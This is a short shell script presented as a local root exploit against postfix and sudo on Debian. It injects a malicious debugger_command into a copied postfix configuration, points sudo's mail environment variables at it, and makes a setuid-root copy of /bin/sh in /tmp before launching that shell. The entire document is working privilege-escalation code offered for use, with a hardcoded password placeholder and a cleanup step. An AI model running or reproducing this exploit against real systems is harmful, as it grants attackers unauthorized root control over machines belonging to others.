#!/bin/sh
#
# root shell exploit for postfix + sudo
# tested on debian powerpc unstable
#
# by Charles 'core' Stevenson <core@bokeoa.com>

# Put your password here if you're not in the sudoers file
PASSWORD=wdnownz

echo -e "sudo exploit by core <core@bokeoa.com>\n"

echo "Setting up postfix config directory..."
/bin/cp -r /etc/postfix /tmp

echo "Adding malicious debugger command..."
echo "debugger_command = /bin/cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh">>/tmp/postfix/main.cf

echo "Setting up environment..."
export MAIL_CONFIG=/tmp/postfix
export MAIL_DEBUG=

sleep 2

echo "Trying to exploit..."
echo -e "$PASSWORD\n"|/usr/bin/sudo su -

sleep 2

echo "We should have a root shell let's check..."
ls -l /tmp/sh

echo "Cleaning up..."
rm -rf /tmp/postfix

echo "Attempting to run root shell..."
/tmp/sh
